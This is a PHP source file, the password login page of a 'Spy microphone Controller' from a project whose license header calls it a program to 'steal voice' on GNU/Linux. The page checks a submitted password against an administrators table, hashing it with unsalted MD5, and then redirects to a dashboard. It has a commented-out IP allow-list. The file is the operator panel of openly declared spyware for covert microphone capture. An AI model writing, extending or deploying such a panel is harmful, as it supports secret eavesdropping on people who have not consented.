<?php

#
# Copyright (c) 2018 Barchampas Gerasimos <makindosx@gmail.com>
# spy-microphone is a program for steal voice in gnu/linux OS.
#
# spy-microphone is free software: you can redistribute it and/or modify
# it under the terms of the GNU Affero General Public License as
# published by the Free Software Foundation, either version 3 of the
# License, or (at your option) any later version.
#
#
# spy-microphone is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU Affero General Public License for more details.
#
# You should have received a copy of the GNU Affero General Public License, version 3,
# along with this program.  If not, see <http://www.gnu.org/licenses/>
#

 session_start();

?>


<html>
<head>


<meta charset="utf-8">

    <title> Spy microphone Controller </title>

    <link rel="Shortcut Icon" type="image/ico" href="favicon.ico">

  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.0/jquery.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>

 <link rel="stylesheet" type="text/css" href="index.css"> 



<style>


body
{
background: #952929 ; 
}
      
  
.container
{
max-width: 500px;
padding-left: 90px;
padding-top: 60px;
}

        
.btn-default:hover, .btn-default:focus
{
background-color: #5cb85c;
border-color: #5cb85c;
color: white;
}


.form-control 
{
height: 45px !important;
}

.btn-block
{
width: 145px;
height: 45px !important;
}
      
</style>
 


</head>



<body>


 <div class="container">
    <div class="col-xs-12 col-sm-12 col-md-12">

       
      <img src="assets/img/find_user.png" class="img-responsive" height="250px;" width="280px;">

      <div class="row">
        <h3 class="text-center" style="padding-right: 80px; color:white;"> Spy Microphone </h3>
      </div>


      <div class="row">
           <form action="" method="post">
          <div class="input-group col-xs-9 col-sm-9 col-md-9">

         <input type="password" name="password" class="form-control" required>

          <div class="input-group-btn">
            <button class="btn btn-md btn-danger btn-block" name="submit">
               <span class="glyphicon glyphicon-arrow-right"></span>
           </button>
          </div>

          </div>

      </div>
  </div>





</body>
</html>


<?php
 

//$allow= ip2long("127.0.0.1"); // for mozilla browser
//$allow2 = ip2long("::1"); // for chrome browser
//$ip = ip2long($_SERVER['REMOTE_ADDR']); // ip tou client
//$location = '/error'; // edw stelnw ton spam xrhsth
//if ($ip!=$allow & $ip !=$allow2)
 //{
//stelnw se allo url
//header ('HTTP/1.1 301 Moved Permanently');
//header ('Location: '.$location);
//}


//else
 // {


 if(isset($_POST['submit']))
  {

  require('__ROOT__/connect.php');
  require('__DEV__/function.php');

 $obj = new DATABASE_CONNECT;
 
  $host=$obj->connect[0];
  $user=$obj->connect[1];
  $pass=$obj->connect[2];
  $db=$obj->connect[3];
  
  $conn = new mysqli($host,$user,$pass,$db);
  
  if($conn->connect_error)
     {
     die ("Cannot connect to server " .$conn->connect_error);
       }

else
{

  $password = md5(input($_POST['password']));
  $password = $conn->real_escape_string($password); 

  $sql ="select user_id,password,verify from administrators 
         where binary password='$password' and verify='yes'";

  $result=$conn->query($sql);
  $rows = $result->num_rows;

  if ($rows == 1) 
     {  
 
      while ($rows2 = $result->fetch_assoc())
         {
         $user_id = $rows2['user_id'];
          }

      $_SESSION['login'] = $user_id;

      header('Location: dashboard.php');
    
     }


     else
      {
       echo '<script type="text/javascript">alert("Sign in control panel error");
         </script>';
       }


 } // end else connect

 
 $conn->close();


} // end of isset submit
 
//} //kleisimo ths megalhs else gia elenxo ths ip


?>

